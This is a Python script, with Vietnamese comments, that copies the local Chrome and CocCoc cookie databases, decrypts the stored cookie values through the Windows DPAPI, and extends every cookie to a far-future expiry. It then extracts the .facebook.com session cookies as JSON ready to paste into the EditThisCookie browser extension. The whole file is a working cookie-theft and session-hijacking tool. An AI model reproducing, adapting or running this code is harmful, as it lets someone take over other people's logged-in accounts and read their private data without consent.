#edit this cookies
host_key_get =[".facebook.com"]


#Based off https://gist.github.com/DakuTree/98c8362fb424351b803e & pieces of https://gist.github.com/jordan-wright/5770442
from os import getenv
from shutil import copyfile
import sqlite3
import win32crypt #https://sourceforge.net/projects/pywin32/



def get_all_cookies_chrome():
	# Copy Cookies to current folder
	copyfile(getenv("APPDATA") + "/../Local/Google/Chrome/User Data/Default/Cookies", './Cookies')
	
	# Connect to the Database
	conn = sqlite3.connect('./Cookies')
	cursor = conn.cursor()
	
	# Get the results
	cursor.execute('SELECT host_key, name, path, encrypted_value FROM cookies')

	list_cookies = []
	id =0 
	for host_key, name, path, encrypted_value in cursor.fetchall():
	# Decrypt the encrypted_value
		decrypted_value = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode('utf-8') or path or 0
	    
		cursor.execute('\
			UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1\
			WHERE host_key = ?\
			AND name = ?',
			(decrypted_value, host_key, name));
		
		
		dict_child = {}
		
		dict_child["domain"] = host_key
		dict_child["name"]=name
		dict_child["value"] = decrypted_value
		
		id += 1
		dict_child["path"] = path #bắt buột có path
		dict_child["id"] =id.__str__()
		
		list_cookies.append(dict_child)
		
	conn.commit()
	conn.close()
	return list_cookies

def get_all_cookies_coccoc():
	# Copy Cookies to current folder
	copyfile(getenv("APPDATA") + "/../Local/CocCoc/Browser/User Data/Default/Cookies", './Cookies')
	
	# Connect to the Database
	conn = sqlite3.connect('./Cookies')
	cursor = conn.cursor()
	
	# Get the results
	cursor.execute('SELECT host_key, name, path, encrypted_value FROM cookies')

	list_cookies = []
	id =0 
	for host_key, name, path, encrypted_value in cursor.fetchall():
	# Decrypt the encrypted_value
		decrypted_value = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode('utf-8') or path or 0
	    
		cursor.execute('\
			UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1\
			WHERE host_key = ?\
			AND name = ?',
			(decrypted_value, host_key, name));
		
		
		dict_child = {}
		
		dict_child["domain"] = host_key
		dict_child["name"]=name
		dict_child["value"] = decrypted_value
		
		id += 1
		dict_child["path"] = path #bắt buột có path
		dict_child["id"] =id.__str__()
		
		list_cookies.append(dict_child)
		
	conn.commit()
	conn.close()
	return list_cookies


# host chỉ định--> trả về json cho edit this cookies dùng
def get_cookies_host_key(list_all_cookies):
	list_cookies = []
	id =0 
	for cookies in list_all_cookies:
		for host_key in host_key_get:
			dict_child = {}
			if(cookies["domain"]==host_key):
				dict_child["domain"] = cookies["domain"]
				dict_child["name"]=cookies["name"]
				dict_child["value"] = cookies["value"]
		 		
				id += 1
				dict_child["path"] = cookies["path"] #bắt buột có path
				dict_child["id"] =id.__str__()
			
		 		
				list_cookies.append(dict_child)
	
	str_cookies_format = list_cookies.__str__().replace('\'','\"')
	return str_cookies_format
	
def print_cookies(list_all_cookies):
	str_cookies =""
	for cookies in list_all_cookies:	
		str_cookies =str_cookies+cookies.__str__()+"\n"
		
	return str_cookies

#sử dụng các hàm này
#(1)
# print(print_cookies(get_all_cookies_chrome()))
#(2)
# print(get_cookies_host_key(get_all_cookies_chrome()))
# print(get_all_cookies().__sizeof__())

